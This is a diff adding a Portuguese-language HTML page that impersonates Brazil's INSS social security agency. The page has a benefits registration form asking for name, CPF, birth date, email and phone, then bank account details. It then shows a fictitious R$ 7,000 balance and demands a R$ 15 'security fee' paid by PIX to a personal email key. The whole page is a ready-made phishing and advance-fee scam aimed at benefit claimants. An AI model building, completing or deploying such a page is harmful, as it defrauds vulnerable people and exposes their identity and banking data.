@@ -1,1 +1,437 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>INSS - Cadastro e Benefícios</title>
+<style>
+* {
+margin: 0;
+padding: 0;
+box-sizing: border-box;
+font-family: 'Arial', sans-serif;
+}
 
+body {
+background-color: #f5f5f5;
+color: #333;
+}
+
+.header {
+background-color: #0066b3;
+color: white;
+padding: 15px 0;
+box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+}
+
+.container {
+width: 90%;
+max-width: 1200px;
+margin: 0 auto;
+}
+
+.header-content {
+display: flex;
+align-items: center;
+justify-content: space-between;
+}
+
+.logo {
+display: flex;
+align-items: center;
+}
+
+.logo img {
+height: 50px;
+margin-right: 15px;
+}
+
+.logo-text h1 {
+font-size: 24px;
+font-weight: bold;
+}
+
+.logo-text span {
+font-size: 14px;
+}
+
+.main {
+padding: 30px 0;
+}
+
+.card {
+background-color: white;
+border-radius: 5px;
+box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+padding: 30px;
+margin-bottom: 30px;
+}
+
+.card h2 {
+color: #0066b3;
+margin-bottom: 20px;
+border-bottom: 1px solid #eee;
+padding-bottom: 10px;
+}
+
+.form-group {
+margin-bottom: 20px;
+}
+
+.form-group label {
+display: block;
+margin-bottom: 5px;
+font-weight: bold;
+}
+
+.form-group input, .form-group select {
+width: 100%;
+padding: 10px;
+border: 1px solid #ddd;
+border-radius: 4px;
+font-size: 16px;
+}
+
+.btn {
+background-color: #0066b3;
+color: white;
+border: none;
+padding: 12px 20px;
+border-radius: 4px;
+cursor: pointer;
+font-size: 16px;
+transition: background-color 0.3s;
+}
+
+.btn:hover {
+background-color: #005599;
+}
+
+.btn-pix {
+background-color: #32BCAD;
+margin-top: 20px;
+}
+
+.btn-pix:hover {
+background-color: #2aa899;
+}
+
+.hidden {
+display: none;
+}
+
+.success-message {
+background-color: #dff0d8;
+color: #3c763d;
+padding: 15px;
+border-radius: 4px;
+margin-bottom: 20px;
+}
+
+.deposit-info {
+margin-top: 20px;
+}
+
+.deposit-info p {
+margin-bottom: 10px;
+}
+
+.balance-display {
+text-align: center;
+padding: 30px;
+background-color: #f8f9fa;
+border-radius: 5px;
+margin-bottom: 30px;
+}
+
+.balance-amount {
+font-size: 36px;
+font-weight: bold;
+color: #28a745;
+margin: 20px 0;
+}
+
+.security-warning {
+background-color: #fff3cd;
+color: #856404;
+padding: 15px;
+border-radius: 4px;
+margin: 20px 0;
+}
+
+.pix-page {
+text-align: center;
+padding: 30px;
+}
+
+.pix-qrcode {
+width: 200px;
+height: 200px;
+margin: 20px auto;
+background-color: #eee;
+display: flex;
+align-items: center;
+justify-content: center;
+border: 1px dashed #ccc;
+}
+
+.pix-key {
+background-color: #f8f9fa;
+padding: 15px;
+border-radius: 4px;
+margin: 20px 0;
+font-family: monospace;
+font-size: 18px;
+word-break: break-all;
+}
+
+.footer {
+background-color: #0066b3;
+color: white;
+text-align: center;
+padding: 15px 0;
+margin-top: 30px;
+}
+</style>
+</head>
+<body>
+<header class="header">
+<div class="container header-content">
+<div class="logo">
+<img src="https://www.gov.br/inss/pt-br/++theme++padrao_govbr/img/inss_logo.png" alt="INSS">
+<div class="logo-text">
+<h1>INSS</h1>
+<span>Instituto Nacional do Seguro Social</span>
+</div>
+</div>
+</div>
+</header>
+
+<main class="main">
+<div class="container">
+<div id="registration-section" class="card">
+<h2>Cadastro para Benefícios</h2>
+<form id="registration-form">
+<div class="form-group">
+<label for="nome">Nome Completo</label>
+<input type="text" id="nome" name="nome" required>
+</div>
+
+<div class="form-group">
+<label for="cpf">CPF</label>
+<input type="text" id="cpf" name="cpf" required placeholder="000.000.000-00">
+</div>
+
+<div class="form-group">
+<label for="nascimento">Data de Nascimento</label>
+<input type="date" id="nascimento" name="nascimento" required>
+</div>
+
+<div class="form-group">
+<label for="beneficio">Tipo de Benefício</label>
+<select id="beneficio" name="beneficio" required>
+<option value="">Selecione...</option>
+<option value="aposentadoria">Aposentadoria</option>
+<option value="auxilio-doenca">Auxílio-Doença</option>
+<option value="salario-maternidade">Salário Maternidade</option>
+<option value="pensao">Pensão por Morte</option>
+<option value="bpc">BPC/LOAS</option>
+</select>
+</div>
+
+<div class="form-group">
+<label for="email">E-mail</label>
+<input type="email" id="email" name="email" required>
+</div>
+
+<div class="form-group">
+<label for="telefone">Telefone</label>
+<input type="tel" id="telefone" name="telefone" required placeholder="(00) 00000-0000">
+</div>
+
+<button type="submit" class="btn">Concluir Cadastro</button>
+</form>
+</div>
+
+<div id="deposit-section" class="card hidden">
+<h2>Depósito em Conta</h2>
+<div class="success-message">
+Cadastro realizado com sucesso! Agora você pode configurar o depósito do seu benefício.
+</div>
+
+<form id="deposit-form">
+<div class="form-group">
+<label for="banco">Banco</label>
+<select id="banco" name="banco" required>
+<option value="">Selecione seu banco...</option>
+<option value="001">Banco do Brasil</option>
+<option value="033">Santander</option>
+<option value="237">Bradesco</option>
+<option value="341">Itaú</option>
+<option value="104">Caixa Econômica Federal</option>
+<option value="outro">Outro</option>
+</select>
+</div>
+
+<div class="form-group">
+<label for="agencia">Agência</label>
+<input type="text" id="agencia" name="agencia" required>
+</div>
+
+<div class="form-group">
+<label for="conta">Conta Corrente</label>
+<input type="text" id="conta" name="conta" required>
+</div>
+
+<div class="form-group">
+<label for="tipo-conta">Tipo de Conta</label>
+<select id="tipo-conta" name="tipo-conta" required>
+<option value="corrente">Conta Corrente</option>
+<option value="poupanca">Conta Poupança</option>
+</select>
+</div>
+
+<div class="deposit-info">
+<p><strong>Informações importantes:</strong></p>
+<p>- O depósito será realizado mensalmente na data especificada para seu benefício.</p>
+<p>- Em caso de alteração de conta, atualize seus dados no sistema.</p>
+</div>
+
+<button type="submit" class="btn">Confirmar Dados para Depósito</button>
+</form>
+</div>
+
+<div id="withdrawal-section" class="card hidden">
+<h2>Saldo Disponível para Saque</h2>
+
+<div class="balance-display">
+<p>Você tem um saldo disponível de:</p>
+<div class="balance-amount">R$ 7.000,00</div>
+<p>para ser retirado</p>
+</div>
+
+<div class="security-warning">
+<p><strong>Atenção:</strong> Para efetuar o saque, é necessário realizar o pagamento da taxa de segurança no valor de R$ 15,00.</p>
+<p>Esta taxa garante a autenticidade da transação e a segurança dos seus dados.</p>
+</div>
+
+<button id="pagar-taxa-btn" class="btn btn-pix">Pagar Taxa de Segurança via PIX</button>
+</div>
+
+<div id="pix-section" class="card hidden">
+<div class="pix-page">
+<h2>Pagamento da Taxa de Segurança</h2>
+<p>Realize o pagamento de R$ 15,00 via PIX para liberar seu saque</p>
+
+<div class="pix-qrcode">
+[QR CODE PIX]
+</div>
+
+<p>Ou utilize a chave PIX:</p>
+<div class="pix-key">fellipe06122006@gmail.com</div>
+
+<p>Após o pagamento, seu saque será liberado automaticamente em até 15 minutos.</p>
+<p>Você receberá um e-mail com as instruções para concluir o processo.</p>
+
+<button id="voltar-btn" class="btn">Voltar</button>
+</div>
+</div>
+</div>
+</main>
+
+<footer class="footer">
+<div class="container">
+<p>Instituto Nacional do Seguro Social - INSS</p>
+<p>Governo Federal - Brasil</p>
+</div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+// Máscaras para os campos
+const cpfInput = document.getElementById('cpf');
+const telefoneInput = document.getElementById('telefone');
+
+cpfInput.addEventListener('input', function(e) {
+let value = e.target.value.replace(/\D/g, '');
+if (value.length > 3) value = value.replace(/^(\d{3})/, '$1.');
+if (value.length > 7) value = value.replace(/^(\d{3})\.(\d{3})/, '$1.$2.');
+if (value.length > 11) value = value.replace(/^(\d{3})\.(\d{3})\.(\d{3})/, '$1.$2.$3-');
+e.target.value = value.substring(0, 14);
+});
+
+telefoneInput.addEventListener('input', function(e) {
+let value = e.target.value.replace(/\D/g, '');
+if (value.length > 0) value = '(' + value;
+if (value.length > 3) value = value.substring(0, 3) + ') ' + value.substring(3);
+if (value.length > 10) value = value.substring(0, 10) + '-' + value.substring(10);
+e.target.value = value.substring(0, 15);
+});
+
+// Elementos das seções
+const registrationSection = document.getElementById('registration-section');
+const depositSection = document.getElementById('deposit-section');
+const withdrawalSection = document.getElementById('withdrawal-section');
+const pixSection = document.getElementById('pix-section');
+
+// Formulário de cadastro
+const registrationForm = document.getElementById('registration-form');
+
+registrationForm.addEventListener('submit', function(e) {
+e.preventDefault();
+
+// Simulação de envio de dados
+setTimeout(function() {
+// Esconde o formulário de cadastro e mostra o de depósito
+registrationSection.classList.add('hidden');
+depositSection.classList.remove('hidden');
+
+// Rola a página para o topo do formulário de depósito
+depositSection.scrollIntoView({ behavior: 'smooth' });
+}, 1000);
+});
+
+// Formulário de depósito
+const depositForm = document.getElementById('deposit-form');
+
+depositForm.addEventListener('submit', function(e) {
+e.preventDefault();
+
+// Simulação de envio de dados
+setTimeout(function() {
+// Esconde o formulário de depósito e mostra a seção de saque
+depositSection.classList.add('hidden');
+withdrawalSection.classList.remove('hidden');
+
+// Rola a página para o topo da seção de saque
+withdrawalSection.scrollIntoView({ behavior: 'smooth' });
+}, 1000);
+});
+
+// Botão para pagar taxa via PIX
+const pagarTaxaBtn = document.getElementById('pagar-taxa-btn');
+
+pagarTaxaBtn.addEventListener('click', function() {
+// Esconde a seção de saque e mostra a seção PIX
+withdrawalSection.classList.add('hidden');
+pixSection.classList.remove('hidden');
+
+// Rola a página para o topo da seção PIX
+pixSection.scrollIntoView({ behavior: 'smooth' });
+});
+
+// Botão para voltar
+const voltarBtn = document.getElementById('voltar-btn');
+
+voltarBtn.addEventListener('click', function() {
+// Esconde a seção PIX e mostra a seção de saque
+pixSection.classList.add('hidden');
+withdrawalSection.classList.remove('hidden');
+
+// Rola a página para o topo da seção de saque
+withdrawalSection.scrollIntoView({ behavior: 'smooth' });
+});
+});
+</script>
+</body>
+</html>
